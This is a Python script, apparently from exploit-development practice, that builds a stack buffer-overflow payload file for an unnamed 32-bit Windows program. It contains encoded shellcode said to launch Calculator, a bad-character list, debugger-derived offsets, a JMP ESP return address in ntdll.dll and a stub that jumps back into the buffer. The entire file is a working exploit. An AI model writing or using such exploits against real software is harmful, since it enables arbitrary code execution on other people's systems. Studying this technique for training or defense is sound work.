import struct

outputfile = "console.txt"
badchars = "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28"


# Shellcode 32-bit Run Calc
buf = "\x90" * 8
buf += b"\xdb\xd4\xbe\x5e\x2d\x0e\x1f\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x30\x31\x77\x18\x03\x77\x18\x83\xc7\x5a\xcf"
buf += b"\xfb\xe3\x8a\x8d\x04\x1c\x4a\xf2\x8d\xf9\x7b\x32\xe9"
buf += b"\x8a\x2b\x82\x79\xde\xc7\x69\x2f\xcb\x5c\x1f\xf8\xfc"
buf += b"\xd5\xaa\xde\x33\xe6\x87\x23\x55\x64\xda\x77\xb5\x55"
buf += b"\x15\x8a\xb4\x92\x48\x67\xe4\x4b\x06\xda\x19\xf8\x52"
buf += b"\xe7\x92\xb2\x73\x6f\x46\x02\x75\x5e\xd9\x19\x2c\x40"
buf += b"\xdb\xce\x44\xc9\xc3\x13\x60\x83\x78\xe7\x1e\x12\xa9"
buf += b"\x36\xde\xb9\x94\xf7\x2d\xc3\xd1\x3f\xce\xb6\x2b\x3c"
buf += b"\x73\xc1\xef\x3f\xaf\x44\xf4\xe7\x24\xfe\xd0\x16\xe8"
buf += b"\x99\x93\x14\x45\xed\xfc\x38\x58\x22\x77\x44\xd1\xc5"
buf += b"\x58\xcd\xa1\xe1\x7c\x96\x72\x8b\x25\x72\xd4\xb4\x36"
buf += b"\xdd\x89\x10\x3c\xf3\xde\x28\x1f\x99\x21\xbe\x25\xef"
buf += b"\x22\xc0\x25\x5f\x4b\xf1\xae\x30\x0c\x0e\x65\x75\xe2"
buf += b"\x44\x24\xdf\x6b\x01\xbc\x62\xf6\xb2\x6a\xa0\x0f\x31"
buf += b"\x9f\x58\xf4\x29\xea\x5d\xb0\xed\x06\x2f\xa9\x9b\x28"
buf += b"\x9c\xca\x89\x4a\x43\x59\x51\x8d"

# To be replaced with the payload
# 1032 - length of the payload
padding = buf + "\xcc"*(1032-len(buf))

# After using !mona pc 1500 and !mona findmsp
# Padding info in register and SEH alignment are below
# EIP contains normal pattern : 0x69423569 (offset 1036)
# ESP (0x0018ff1c) points at offset 1040 in normal pattern (length 210)
# EBP contains normal pattern : 0x42346942 (offset 1032)
# SEH record (nseh field) at 0x0018ffc4 overwritten with normal pattern : 0x336f4232 (offset 1208)

# Break point at 0x004012AF for debugging the bug
# POP EBP
# RET
ebp = "BBBB"

# JMP ESP search using !mona find -s "\xff\xe4"
# 0x7de9d07b (b+0x0002d07b)  : "\xff\xe4" |  {PAGE_EXECUTE_READ} [ntdll.dll] ASLR: True, Rebase: False, SafeSEH: True, OS: True, v6.1.7600.16385 (C:\Windows\SysWOW64\ntdll.dll)

eip = struct.pack('L',0x7de9d07b)

# Code execution with \xCC (Breakpoint)
# Out payload location is 0x0018fb0c and -410 (-1040) behind
# Let's adjust the ESP and JMP 
# !mona asm -s "add esp,-410 # jmp esp"
# Full opcode : \x81\xc4\xf0\xfb\xff\xff\xff\xe4
jmpback = "\x81\xc4\xf0\xfb\xff\xff\xff\xe4"
esp = jmpback + "\xcc" * (168 - len(jmpback))

# Don't trigger SEH unless  you turn it to a SEH exploit
nseh = "" #"EEEE"
seh = "" #"FFFF"

buffer = padding + ebp + eip + esp + nseh + seh

print("[+] Creating %s" % outputfile)
f = open(outputfile,'wb')
print("[+] Writing %d bytes to file" % len(buffer))
f.write(buffer)
print("[+] Done")
f.close()